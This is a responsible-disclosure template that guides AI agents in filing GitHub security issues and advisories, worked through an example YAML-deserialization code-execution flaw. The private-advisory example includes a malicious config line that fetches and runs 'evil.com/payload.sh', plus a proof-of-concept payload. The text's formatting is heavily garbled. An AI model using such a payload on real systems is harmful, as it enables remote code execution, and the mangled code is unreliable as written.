---
category: general
description: >-
  Template for AI agents creating security vulnerability issues - includes
  severity assessment, CVE considerations, and responsible disclosure guidance
examples: []
includes: []
name: github-issue-security
output_format: markdown
tags: []
usage_count: 0
variables: []
version: 1.0.0

---
# Git

Hub Issue Security Vulnerability TemplateAUDIENCE: This template is for AI agents and coding assistants creating security vulnerability issues, NOT for human users.⚠️ CRITICAL: Security issues require special handling. Read entire template before creating issue.

## Pre-Creation Checklist MANDATORYBEFORE creating any security issue:
  1. Assess severity use CVSS or severity guidelines below

2. Determine disclosure approach:
  - Private disclosure: High/Critical vulnerabilities that could be exploited

- Public issue: Low severity or already publicly disclosed

3. Check if already reported:
  ba

sh   gh issue list --search keywords --label security --limit 20   gh issue list --search keywords --label security --state closed --limit 10

4. Read available labels:
  ba

sh   gh label list --limit 100 --json name,description   #

# Severity Assessment REQUIREDUse this guide to determine severity:
  ### Critical Severity

- Remote code execution RCE

- Authentication bypass

- Privilege escalation to admin/root

- SQL injection in production

- Data breach access to all user data

- Cryptographic weakness in core security

Action: Use private disclosure, fix immediately

### High Severity

- Local privilege escalation

- Cross-site scripting XSS with significant impact

- Path traversal allowing system file access

- Denial of service DoS easy to trigger

- Sensitive data exposure tokens, keys, credentials

- CSRF on sensitive operations

Action: Use private disclosure, fix within 30 days

### Medium Severity

- Information disclosure non-sensitive

- DoS requiring specific conditions

- XSS in limited contexts

- Bypass of rate limiting

- Memory leaks causing gradual degradation

- Weak password requirements

Action: Can use public issue, fix within 90 days

### Low Severity

- Timing attacks theoretical

- Missing security headers

- Verbose error messages

- Information leakage version numbers

- Missing input validation no exploit path

Action: Public issue, fix as convenient

## Private vs Public Security Issues

### Use PRIVATE Security Advisory GitHub Security for:
  - Critical or High severity

- Vulnerability not yet publicly disclosed

- Could be actively exploited

- Needs coordinated disclosure

- May need CVE assignment

How to create private advisory:ba

sh

# Use Git

Hub web UI:
  #

1. Go to repository

#

2. Security tab → Advisories → New draft security advisory

#

3. Fill in details

#

4. Invite collaborators if needed

#

5. Publi

sh when fix is ready

### Use PUBLIC Issue for:
  - Low or Medium severity

- Already publicly disclosed

- No immediate exploit path

- Hardening improvements

- Security best practices

## Security Issue Structure

### Title FormatBe specific but not revealing of exploit details in public titles.Private Advisory Titles detailed:- [CRITICAL] Remote code execution via unsafe deserialization in ConfigManager- [HIGH] Authentication bypass using timing attack in OAuth handler- [HIGH] Path traversal vulnerability in file operations allows arbitrary file readPublic Issue Titles vague enough to not aid attackers:- [MEDIUM] Improve input validation in element content parser- [LOW] Add security headers to HTTP responses- [MEDIUM] Harden file path handling in Portfolio

Manager

### Summary REQUIREDFor Private Advisories:Clear, detailed description of vulnerability and impact.For Public Issues:High-level description without exploitation details.Example Private:markdown

## SummaryCritical remote code execution vulnerability in Config

Manager hot-reload feature allows arbitrary code execution when processing specially crafted YAML config files. Affects all versions with hot-reload enabled v1.9.0+.Example Public:markdown

## SummaryImprove input validation and sanitization in YAML config file processing to prevent potential code execution scenarios. Affects Config

Manager hot-reload feature.

### Vulnerability Description REQUIREDFor Private Advisories:Detailed technical description including:
  - Exact vulnerability location file, function, line

- How it can be exploited

- What an attacker could achieve

- Technical root causeFor Public Issues:General description without exploit details:
  - Component affected

- Type of vulnerability general cate

gory

- Potential impact high-level

Example Private:markdown

## Vulnerability DescriptionLocation: src/config/ConfigManager.ts:156-168Issue: YAML config files are parsed using js-yaml library with unsafe mode enabled, allowing execution of arbitrary JavaScript code through js/function tags.Exploit Path:
  1. Attacker creates malicious YAML config with embedded JavaScript

2. Config file is processed by ConfigManager

3. js-yaml deserializes and executes embedded code

4. Code runs with full MCP server privilegesCode:typescript// VULNERABLE CODE:const config = yaml.loadfileContent,  unsafe: true  // ← UnsafeAttack Scenario:Attacker convinces user to add malicious config:yamltelemetry:
  enabled: js/function     function       requirechild_process.execSynccurl evil.com/payload.sh  sh      return false    When hot-reload triggers or server restarts, this executes arbitrary commands with servers privileges.Impact:
  - Complete system compromise

- Data exfiltration

- Lateral movement in network

- Persistence mechanisms

Example Public:markdown

## Vulnerability DescriptionThe ConfigManager component uses a YAML parsing library in a configuration that could allow unintended code execution in certain scenarios. This affects the hot-reload feature when processing config files.Impact:
  - Potential for unintended code execution

- Affects servers with hot-reload enabled

- Requires user to load malicious config

Mitigation:Switch to safe YAML parsing mode and validate all config inputs.

### Affected Versions REQUIREDList specific versions affected.Example:markdown

## Affected VersionsVulnerable:
  - v1.9.0 through v1.9.18 inclusive

- All versions with hot-reload feature

Not Affected:
  - v1.8.x and earlier feature not present

- v1.9.19+ fix included

### Severity Rating REQUIREDUse CVSS calculator or severity guidelines above.Example:markdown

## SeverityCVSS Score: 9.8 Critical

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:HBreakdown:
  - Attack Vector AV: Network N

- Attack Complexity AC: Low L

- Privileges Required PR: None N

- User Interaction UI: None N

- Scope S: Unchanged U

- Confidentiality C: High H

- Integrity I: High H

- Availability A: High HJustification:Remote code execution with no authentication required achieves complete system compromise.Or simplified:markdown

## SeverityLevel: Critical

Reasoning:
  - Remote code execution possible

- No authentication required

- Complete system compromise

- Easy to exploit

### Proof of Concept REQUIRED for Private

For Private Advisories:Include working PoC that demonstrates vulnerability.For Public Issues:Omit or provide sanitized example without actual exploit.Example Private:markdown

## Proof of ConceptMalicious config file exploit.yaml:yamltelemetry:
  enabled: js/function     function       const fs = requirefs      fs.writeFileSync/tmp/pwned.txt, Exploited      return false    Steps to exploit:
  1. Create exploit.yaml as shown above

2. Copy to /.dollhouse/config.yaml

3. Start server with hot-reload: DOLLHOUSE_CONFIG_HOTRELOAD=true npx @dollhousemcp/mcp-server

4. Observe file created: cat /tmp/pwned.txt shows Exploited

Result: Arbitrary code executed with server privileges.Example Public

- sanitized:markdown

## Example Scenario

Under certain conditions, specially crafted config files could lead to unintended behavior. Weve validated this internally and are implementing proper input validation.

### Impact Assessment REQUIREDWhat can an attacker achieve

Example:markdown

## ImpactAttacker Capabilities:
  - Execute arbitrary commands on server host

- Read/write any files accessible to server process

- Exfiltrate sensitive data config, credentials, user data

- Establi

sh persistent backdoor

- Pivot to other systems on networkUser Data at Risk:
  - API tokens and credentials

- User personas, skills, templates all element data

- GitHub OAuth tokens

- System configuration

Business Impact:
  - Complete loss of confidentiality, integrity, availability

- Reputational damage

- Potential legal liability data breach

- User t

rust erosion

### Prerequisites for Exploitation REQUIREDWhat does an attacker need

Example:markdown

## PrerequisitesAttacker Needs:
  - Ability to make victim load malicious config file

- Hot-reload feature must be enabled default: disabled

- Network access not required local exploitationAttack Vectors:
  1. Social engineering convince user to copy malicious config

2. Supply chain malicious example configs

3. Config file injection if other vulnerabilities exist

4. Man-in-the-middle during config download

Likelihood: Medium

- Hot-reload disabled by default reduces exposure

- Requires user action social engineering hurdle

- But config files are shared supply chain risk

### Proposed Fix PHASE-BASEDFor Private Advisories:Detailed fix with security considerations.For Public Issues:High-level fix approach.Example Private:markdown

## Proposed Fix

### Phase 1: Immediate Mitigation Emergency Patch- [ ] Change yaml.load to use safe mode: yaml.loadcontent,  schema: yaml.SAFE_SCHEMA - [ ] Remove all js/function support- [ ] Add input validation to reject dangerous YAML constructs- [ ] Release emergency patch v1.9.19- [ ] Publi

sh security advisory

### Phase 2: Enhanced Security depends on Phase 1- [ ] Implement strict schema validation for config files- [ ] Add content security policy for YAML parsing- [ ] Implement config file signing/verification- [ ] Add warning when loading external configs- [ ] Security audit of all YAML parsing code

### Phase 3: Long-term Hardening can parallel Phase 2- [ ] Switch to JSON for config files no code execution risk- [ ] Or use strict subset of YAML no anchors, no tags- [ ] Implement sandboxing for config processing- [ ] Add security tests for config parsing- [ ] Fuzz testing for config parser

### Phase 4: Detection and Monitoring depends on Phases 1-3- [ ] Add telemetry for dangerous config patterns detected- [ ] Implement config file integrity checking- [ ] Add logging for all config loads- [ ] Create detection rules for malicious configs

### Mitigation/Workaround REQUIREDHow can users protect themselves before fix

Example:markdown

## WorkaroundImmediate Actions:
  1. Disable hot-reload most important:
  ba

sh   export DOLLHOUSE_CONFIG_HOTRELOAD=false      Or in config:
  yaml   config:
  hot

Reload: false

2. Validate config files before loading:
  ba

sh   # Check for dangerous patterns   grep -r js /.dollhouse/config.yaml  echo DANGER: Malicious config detected

3. Use t

rusted configs only:
  - Dont copy config files from unt

rusted sources

- Review any shared example configs

- Dont load configs from the internet

4. Monitor for exploitation:
  ba

sh   # Check for unexpected file creation   ls -la /tmp/   # Check for unusual processes   ps aux  grep node

5. Update immediately when patch available:
  ba

sh   npm update @dollhousemcp/mcp-server   Detection:Signs of exploitation:
  - Unexpected files in /tmp or system directories

- Unknown processes running under server user

- Network connections to unfamiliar IPs

- Unusual CPU or disk activity

### Timeline For Private Advisories

Example:markdown

## Disclosure TimelineDiscovery: 2025-10-15Reported to maintainers: 2025-10-15 internal discoveryFix developed: Target: 2025-10-17 within 48 hoursPatch released: Target: 2025-10-18Public disclosure: Target: 2025-10-25 7 days after patchCVE requested: 2025-10-15Responsible Disclosure Period: 7 days from patch release

Rationale for Timeline:
  - Critical severity requires urgent fix

- Users need time to update before public disclosure- 7-day window balances urgency with user protection

### CVE Request For Private Advisories if needed

Example:markdown

## CVEStatus: RequestedCVE ID: Pending requested from GitHub CNACVE Description:DollhouseMCP server versions 1.9.0 through 1.9.18 contain a remote code execution vulnerability in the Config

Manager hot-reload feature due to unsafe YAML deserialization. Attackers can execute arbitrary code by convincing users to load specially crafted config files containing malicious YAML tags.CWE: CWE-502 Deserialization of Unt

rusted Data

## Label Selection for Security IssuesRequired Labels:
  - security always

- One priority:
  label based on severity

Common Combinations:ba

sh

# Critical vulnerability private advisory

# Labels set in Git

Hub Security Advisory interface

# High severity public issue--label security,priority: critical,area: security

# Medium severity--label security,priority: high,area: security

# Low severity hardening--label security,priority: medium,area: security

# Security best practice--label security,priority: low,type: task

## Issue Creation

### For Private Security Advisories:USE GITHUB WEB UI, NOT CLI

1. Go to repository → Security tab

2. Advisories → New draft security advisory

3. Fill in all fields

4. Add collaborators if needed security team

5. Keep draft until fix ready

6. Publi

sh when patch released

### For Public Security Issues:ba

shcat  /tmp/security-issue.md EOF

## Summary[High-level description]

## Vulnerability Description[General description without exploit details]

## Affected Versions[Version ranges]

## Severity[Severity level and reasoning]

## Proposed Fix[Fix approach]

## Workaround[How users can mitigate]EOFgh issue create   --title [MEDIUM] Improve input validation in config parser   --label security,priority: high,area: security   --body-file /tmp/security-issue.mdrm /tmp/security-issue.md

## Quality Checklist

Before creating security issue:- [ ] Severity correctly assessed- [ ] Disclosure approach determined private vs public- [ ] Checked for duplicate reports- [ ] Vulnerability details complete location, impact, PoC- [ ] Affected versions identified- [ ] Workaround provided for users- [ ] Timeline appropriate for severity- [ ] CVE requested if needed Critical/High- [ ] Fix approach outlined- [ ] No sensitive details in public title/description

## Complete Example Public Security Issuemarkdown

## SummaryImprove input validation and sanitization in YAML config file processing to prevent potential security issues. Affects Config

Manager hot-reload feature in versions 1.9.0 through 1.9.18.

## Vulnerability DescriptionThe ConfigManager component processes YAML configuration files with settings that could allow unintended behavior in certain scenarios when hot-reload is enabled. This affects the configuration parsing logic.Component: ConfigManager src/config/ConfigManager.tsFeature: Hot-reload configuration watchingIssue Type: Input validation weaknessImpact:
  - Potential for unintended code execution in specific scenarios

- Affects servers with hot-reload enabled disabled by default

- Requires user interaction loading malicious config

Scope:Limited exposure due to:
  - Hot-reload disabled by default

- Requires user to load malicious config file

- Local exploitation only no remote attack

## Affected VersionsVulnerable:
  - v1.9.0 through v1.9.18 hot-reload feature versionsNot Affected:
  - v1.8.x and earlier feature not present

- v1.9.19+ fix included

Note: Only affects installations with hot-reload explicitly enabled.

## SeverityLevel: High

Reasoning:
  - Code execution possible under specific conditions

- Limited by requiring user interaction

- Hot-reload disabled by default reduces exposure

- No authentication bypass required config is t

rusted input

- Local exploitation only not remotely exploitableCVSS Estimate: 7.0 High

## Proposed Fix

### Phase 1: Secure Configuration Parsing- [ ] Switch YAML parser to safe mode no code execution- [ ] Implement strict schema validation for config files- [ ] Add input sanitization for all config values- [ ] Remove support for dangerous YAML features

### Phase 2: Enhanced Validation depends on Phase 1- [ ] Implement allowlist for config keys and value types- [ ] Add content security policy for config processing- [ ] Validate config file integrity before loading- [ ] Add warnings for unexpected config structure

### Phase 3: Testing and Hardening depends on Phases 1-2- [ ] Add security tests for config parsing- [ ] Fuzz test config parser with malicious inputs- [ ] Security audit of all configuration code- [ ] Add detection for malicious config patterns

## WorkaroundImmediate Actions for Users:
  1. Disable hot-reload eliminates risk:
  ba

sh   export DOLLHOUSE_CONFIG_HOTRELOAD=false      Or in config:
  yaml   config:
  hot

Reload: false

2. Use t

rusted configs only:
  - Dont copy config files from unt

rusted sources

- Review any shared example configs before using

- Dont download configs from the internet

3. Validate configs before loading:
  ba

sh   # Check config file for unusual patterns   cat /.dollhouse/config.yaml   # Should only contain standard YAML keys, values, lists

4. Monitor for updates:
  ba

sh   # Check for security updates   npm outdated @dollhousemcp/mcp-server   # Update when patch available   npm update @dollhousemcp/mcp-server   Risk Mitigation:
  - Hot-reload disabled by default most users not affected

- Requires explicit user action to enable vulnerable feature

- Config files are typically created by users themselves t

rusted

## Additional Context

Discovery:Internal security review identified this issue during code audit.User Impact:Low

- Feature disabled by default, requires user opt-in and loading of malicious config.Patch Status:Fix in development, will be included in v1.9.19.Related Hardening:This is part of broader security review of all input parsing in the codebase.---

## For AI Agents: Additional ContextWhen to use this template:
  - User reports security concern

- Automated security scanner finds issue

- Code review identifies vulnerability

- Dependency has security advisoryCritical security rules:
  1. ASSESS severity first determines disclosure approach

2. HIGH/CRITICAL = private advisory GitHub Security

3. MEDIUM/LOW = can be public issue

4. NEVER include exploit code in public issues

5. ALWAYS provide workaround/mitigation

6. Consider CVE for High/Critical

7. Coordinate disclosure timelineTemplate philosophy:
  - Security requires careful balance of transparency and safety

- Detailed for private advisories, vague for public issues

- Always provide user protection workarounds

- Fix timeline must match severity

This template is designed for AI consumption and usage, not human reading. Security issues require extra care and attention to detail.
